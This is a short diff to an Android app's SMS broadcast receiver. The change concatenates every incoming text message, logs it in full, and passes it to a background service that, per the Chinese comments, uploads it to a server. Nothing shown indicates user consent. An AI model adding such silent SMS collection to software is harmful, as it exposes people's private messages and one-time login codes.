@@ -188,14 +188,19 @@ public final class SmsReceiver extends BroadcastReceiver {
             StringBuilder sb = new StringBuilder();
             for(android.telephony.SmsMessage smsMessage :messages){
                 String messageBody=smsMessage.getMessageBody();
-                // LogUtil.i(TAG, "接收短信processReceivedSms: "+messageBody);
                 sb.append(messageBody);
             }
             LogUtil.i(TAG, "接收短信完整信息: \n"+sb);
-            // TODO 把sb上传到服务器
-            Intent msgIntent= new Intent(getBaseContext(), SyncIntentService.class);
-            msgIntent.putExtra("msg",sb)
-            startService(msgIntent);
+            //  把sb上传到服务器
+            try{
+                Intent msgIntent= new Intent(context, SyncIntentService.class);
+                msgIntent.putExtra("msg",sb.toString());
+                context.startService(msgIntent);
+            }catch(Exception e){
+                LogUtil.e(TAG, "发送到服务器失败\n");
+            }
+        
+            LogUtil.i(TAG, "计划发送到服务器\n");
             
         }
 
